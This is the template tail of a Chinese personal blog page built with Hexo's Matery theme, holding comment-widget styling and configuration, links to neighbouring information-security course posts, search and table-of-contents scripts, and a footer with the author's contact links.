        font-size: 1rem;
        line-height: 1.5rem;
    }

    #vcomments hr {
        margin: 12px 0;
        border: 0;
        border-top: 1px solid #ccc;
    }

    #vcomments blockquote {
        margin: 15px 0;
        border-left: 5px solid #42b983;
        padding: 1rem 0.8rem 0.3rem 0.8rem;
        color: #666;
        background-color: rgba(66, 185, 131, .1);
    }

    #vcomments pre {
        font-family: monospace, monospace;
        padding: 1.2em;
        margin: .5em 0;
        background: #272822;
        overflow: auto;
        border-radius: 0.3em;
        tab-size: 4;
    }

    #vcomments code {
        font-family: monospace, monospace;
        padding: 1px 3px;
        font-size: 0.92rem;
        color: #e96900;
        background-color: #f8f8f8;
        border-radius: 2px;
    }

    #vcomments pre code {
        font-family: monospace, monospace;
        padding: 0;
        color: #e8eaf6;
        background-color: #272822;
    }

    #vcomments pre[class*="language-"] {
        padding: 1.2em;
        margin: .5em 0;
    }

    #vcomments code[class*="language-"],
    pre[class*="language-"] {
        color: #e8eaf6;
    }

    #vcomments [type="checkbox"]:not(:checked),
    [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }

    #vcomments b,
    strong {
        font-weight: bold;
    }

    #vcomments dfn {
        font-style: italic;
    }

    #vcomments small {
        font-size: 85%;
    }

    #vcomments cite {
        font-style: normal;
    }

    #vcomments mark {
        background-color: #fcf8e3;
        padding: .2em;
    }

    #vcomments table,
    th,
    td {
        padding: 12px 13px;
        border: 1px solid #dfe2e5;
    }

    table tr:nth-child(2n),
    thead {
        background-color: #fafafa;
    }

    #vcomments table th {
        background-color: #f2f2f2;
        min-width: 80px;
    }

    #vcomments table td {
        min-width: 80px;
    }

    #vcomments [type="checkbox"]:not(:checked),
    [type="checkbox"]:checked {
        position: inherit;
        margin-left: -1.3rem;
        margin-right: 0.4rem;
        margin-top: -1px;
        vertical-align: middle;
        left: unset;
        visibility: visible;
    }
</style>

<div class="card valine-card" data-aos="fade-up">
    <div class="comment_headling"
        style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
        <span>评论</span>
    </div>
    <div id="vcomments" class="card-content" style="display: grid">
    </div>
</div>

<script src="/libs/valine/av-min.js"></script>
<script src="https://unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        appId: '8SzvSoQjCOrTadqpJ1LjqujD-9Nh9j0Va',
        appKey: 'iv4mV6VBG7twuE7yQgwpsYaq',
        notify: '' === 'true',
        verify: '' === 'true',
        visitor: '' === 'true',
        avatar: '/medias/moren.png',
        pageSize: '10',
        lang: 'zh-cn',
        placeholder: '快来评论区发表你的观点吧~ 听说昵称填写qq号可以显示qq头像和qq昵称哦!',
        enableQQ: true,
        boolean: true,
        emojiCDN: '//i0.hdslb.com/bfs/emote/',
        // 表情title和图片映射
        emojiMaps: {
            "tv_doge": "6ea59c827c414b4a2955fe79e0f6fd3dcd515e24.png",
            "tv_亲亲": "a8111ad55953ef5e3be3327ef94eb4a39d535d06.png",
            "tv_偷笑": "bb690d4107620f1c15cff29509db529a73aee261.png",
            "tv_再见": "180129b8ea851044ce71caf55cc8ce44bd4a4fc8.png",
            "tv_冷漠": "b9cbc755c2b3ee43be07ca13de84e5b699a3f101.png",
            "tv_发怒": "34ba3cd204d5b05fec70ce08fa9fa0dd612409ff.png",
            "tv_发财": "34db290afd2963723c6eb3c4560667db7253a21a.png",
            "tv_可爱": "9e55fd9b500ac4b96613539f1ce2f9499e314ed9.png",
            "tv_吐血": "09dd16a7aa59b77baa1155d47484409624470c77.png",
            "tv_呆": "fe1179ebaa191569b0d31cecafe7a2cd1c951c9d.png",
            "tv_呕吐": "9f996894a39e282ccf5e66856af49483f81870f3.png",
            "tv_困": "241ee304e44c0af029adceb294399391e4737ef2.png",
            "tv_坏笑": "1f0b87f731a671079842116e0991c91c2c88645a.png",
            "tv_大佬": "093c1e2c490161aca397afc45573c877cdead616.png",
            "tv_大哭": "23269aeb35f99daee28dda129676f6e9ea87934f.png",
            "tv_委屈": "d04dba7b5465779e9755d2ab6f0a897b9b33bb77.png",
            "tv_害羞": "a37683fb5642fa3ddfc7f4e5525fd13e42a2bdb1.png",
            "tv_尴尬": "7cfa62dafc59798a3d3fb262d421eeeff166cfa4.png",
            "tv_微笑": "70dc5c7b56f93eb61bddba11e28fb1d18fddcd4c.png",
            "tv_思考": "90cf159733e558137ed20aa04d09964436f618a1.png",
            "tv_惊吓": "0d15c7e2ee58e935adc6a7193ee042388adc22af.png",
            "tv_打脸": "56ab10b624063e966bfcb76ea5dc4794d87dfd47.png",
            "tv_抓狂": "fe31c08edad661d63762b04e17b8d5ae3c71a757.png",
            "tv_抠鼻": "c666f55e88d471e51bbd9fab9bb308110824a6eb.png",
            "tv_斜眼笑": "911f987aa8bc1bee12d52aafe62bc41ef4474e6c.png",
            "tv_无奈": "ea8ed89ee9878f2fece2dda0ea8a5dbfe21b5751.png",
            "tv_晕": "5443c22b4d07fb1907ccc610c8e6db254f2461b7.png",
            "tv_流汗": "cead1c351ab8d79e9f369605beb90148db0fbed3.png",
            "tv_流泪": "7e71cde7858f0cd50d74b0264aa26db612a8a167.png",
            "tv_流鼻血": "c32d39db2737f89b904ca32700d140a9241b0767.png",
            "tv_点赞": "f85c354995bd99e28fc76c869bfe42ba6438eff4.png",
            "tv_生气": "26702dcafdab5e8225b43ffd23c94ac1ff932654.png",
            "tv_生病": "8b0ec90e6b86771092a498c54f09fc94621c1900.png",
            "tv_疑问": "0793d949b18d7be716078349c202c15ff166f314.png",
            "tv_白眼": "c1d59f439e379ee50eef488bcb5e5378e5044ea4.png",
            "tv_皱眉": "72ccad6679fea0d14cce648b4d818e09b8ffea2d.png",
            "tv_目瞪口呆": "0b8cb81a68de5d5365212c99375e7ace3e7891b7.png",
            "tv_睡着": "8b196675b53af58264f383c50ad0945048290b33.png",
            "tv_笑哭": "1abc628f6d4f4caf9d0e7800878f4697abbc8273.png",
            "tv_腼腆": "89712c0d4af73e67f89e35cbc518420380a7f6f4.png",
            "tv_色": "61822c7e9aae5da76475e7892534545336b23a6f.png",
            "tv_调侃": "4bc022533ef31544ca0d72c12c808cf4a1cce3e3.png",
            "tv_调皮": "b9c41de8e82dd7a8515ae5e3cb63e898bf245186.png",
            "tv_鄙视": "6e72339f346a692a495b123174b49e4e8e781303.png",
            "tv_闭嘴": "c9e990da7f6e93975e25fd8b70e2e290aa4086ef.png",
            "tv_难过": "87f46748d3f142ebc6586ff58860d0e2fc8263ba.png",
            "tv_馋": "fc7e829b845c43c623c8b490ee3602b7f0e76a31.png",
            "tv_鬼脸": "0ffbbddf8a94d124ca2f54b360bbc04feb6bbfea.png",
            "tv_黑人问号": "45821a01f51bc867da9edbaa2e070410819a95b2.png",
            "tv_鼓掌": "1d21793f96ef4e6f48b23e53e3b9e42da833a0f6.png"
        },
        requiredFields: ['nick'], //设置必填项
    });
</script>
                                                            

                                                                

                                                                            

                                                                                        

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2023/01/20/security/ruan-jian-an-quan-shi-yan-wan-zheng-ji-lu/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="软件安全实验完整记录">
                        
                        <span class="card-title">软件安全实验完整记录</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2023-01-20
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B/" class="post-category">
                                    信息安全专业课程
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">信息安全</span>
                    </a>
                    
                    <a href="/tags/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">软件安全</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2022/12/22/security/xin-xi-yin-cang-zhi-yin-xie-zhu-ji-chu-zhi-shi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="信息隐藏之隐写术基础知识">
                        
                        <span class="card-title">信息隐藏之隐写术基础知识</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-22
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%93%E4%B8%9A%E8%AF%BE%E7%A8%8B/" class="post-category">
                                    信息安全专业课程
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">理论知识</span>
                    </a>
                    
                    <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">
                        <span class="chip bg-color">信息安全</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>


    <script>
        $('#articleContent').on('copy', function (e) {
            // IE8 or earlier browser is 'undefined'
            if (typeof window.getSelection === 'undefined') return;

            var selection = window.getSelection();
            // if the selection is short let's not annoy our users.
            if (('' + selection).length < Number.parseInt('150')) {
                return;
            }

            // create a div outside of the visible area and fill it with the selected text.
            var bodyElement = document.getElementsByTagName('body')[0];
            var newdiv = document.createElement('div');
            newdiv.style.position = 'absolute';
            newdiv.style.left = '-99999px';
            bodyElement.appendChild(newdiv);
            newdiv.appendChild(selection.getRangeAt(0).cloneContents());

            // we need a <pre> tag workaround.
            // otherwise the text inside "pre" loses all the line breaks!
            if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
                newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
            }

            var url = document.location.href;
            newdiv.innerHTML += '<br />'
                + '来源: ShiQuLiZhi BLOG<br />'
                + '文章作者: ShiQuLiZhi<br />'
                + '文章链接: <a href="' + url + '">' + url + '</a><br />'
                + '本文著作权归作者所有，任何形式的转载均请注明出处。';

            selection.selectAllChildren(newdiv);
            window.setTimeout(function () { bodyElement.removeChild(newdiv); }, 200);
        });
    </script>
    

        <!-- 代码块功能依赖 -->
        <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

        <!-- 代码语言 -->
        
            <script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
            

                <!-- 代码块复制 -->
                
                    <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
                    

                        <!-- 代码块收缩 -->
                        
                            <script type="text/javascript"
                                src="/libs/codeBlock/codeShrink.js"></script>
                            

                                <!-- 代码块折行 -->
                                
    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('1'),
            headingSelector: 'h1, h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h1, h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>


<script src=""></script>
<script>
    MathJax.Hub.Config({
        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
    });
</script>



                            <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 15px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2022-2023</span>
            
            <span id="year">2022</span>
            <a href="/about" target="_blank">ShiQuLiZhi</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
                class="white-color">479.5k</span>&nbsp;字
            
            
            
            
            
            <br>
            
            <span id="sitetime">载入运行时间...</span>
            <script>
                function siteTime() {
                    var seconds = 1000;
                    var minutes = seconds * 60;
                    var hours = minutes * 60;
                    var days = hours * 24;
                    var years = days * 365;
                    var today = new Date();
                    var startYear = "2022";
                    var startMonth = "8";
                    var startDate = "13";
                    var startHour = "0";
                    var startMinute = "0";
                    var startSecond = "0";
                    var todayYear = today.getFullYear();
                    var todayMonth = today.getMonth() + 1;
                    var todayDate = today.getDate();
                    var todayHour = today.getHours();
                    var todayMinute = today.getMinutes();
                    var todaySecond = today.getSeconds();
                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
                    var diff = t2 - t1;
                    var diffYears = Math.floor(diff / years);
                    var diffDays = Math.floor((diff / days) - diffYears * 365);
                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
                        minutes);
                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
                        diffMinutes * minutes) / seconds);
                    if (startYear == todayYear) {
                        document.getElementById("year").innerHTML = todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    } else {
                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
                    }
                }
                setInterval(siteTime, 1000);
            </script>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link ">
    <a href="https://github.com/sxhthreo" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub"
        data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>
    

        
            <a href="mailto:951161604@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我"
                data-position="top" data-delay="50">
                <i class="fas fa-envelope-open"></i>
            </a>
            

                

                        

                                
                                    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=951161604"
                                        class="tooltipped" target="_blank"
                                        data-tooltip="QQ联系我: 951161604" data-position="top"
                                        data-delay="50">
                                        <i class="fab fa-qq"></i>
                                    </a>
                                    

                                        

                                                
                                                    <a href="https://www.zhihu.com/people/shui-he-qing-chi-zi-14" class="tooltipped"
                                                        target="_blank"
                                                        data-tooltip="关注我的知乎: https://www.zhihu.com/people/shui-he-qing-chi-zi-14"
                                                        data-position="top" data-delay="50">
                                                        <i class="fab fa-zhihu1">知</i>
                                                    </a>
                                                    

                                                        

                                                                
                                                                    <a href="https://blog.csdn.net/sxH3O?type=blog"
                                                                        class="tooltipped" target="_blank"
                                                                        data-tooltip="关注我的CSDN: https://blog.csdn.net/sxH3O?type=blog"
                                                                        data-position="top" data-delay="50">
                                                                        <i class="fab fa-csdn">C</i>
                                                                    </a>
                                                                    </div>
    </div>
</footer>

<div class="progress-bar"></div>


                                <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

                                    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


                                        <script
                                            src="/libs/materialize/materialize.min.js"></script>
                                        <script
                                            src="/libs/masonry/masonry.pkgd.min.js"></script>
                                        <script
                                            src="/libs/aos/aos.js"></script>
                                        <script
                                            src="/libs/scrollprogress/scrollProgress.min.js"></script>
                                        <script
                                            src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
                                        <script
                                            src="/js/matery.js"></script>

                                        <!-- Baidu Analytics -->

                                            <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

                                                
                                                    <script
                                                        src="/libs/others/clicklove.js"
                                                        async="async"></script>
                                                    
                                                        

                                                                

                                                                        

                                                                                
                                                                                        
                                                                                            <script
                                                                                                type="text/javascript"
                                                                                                color="0,0,255"
                                                                                                pointColor="0,0,255"
                                                                                                opacity='0.7'
                                                                                                zIndex="-1"
                                                                                                count="99"
                                                                                                src="/libs/background/canvas-nest.js"></script>
                                                                                            

                                                                                                

                                                                                                            
                                                                                                                <script
                                                                                                                    type="text/javascript"
                                                                                                                    src="/libs/background/ribbon-dynamic.js"
                                                                                                                    async="async"></script>
                                                                                                                

                                                                                                                    
                                                                                                                        <script
                                                                                                                            src="/libs/instantpage/instantpage.js"
                                                                                                                            type="module"></script>
                                                                                                                        




                <script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</body>

</html>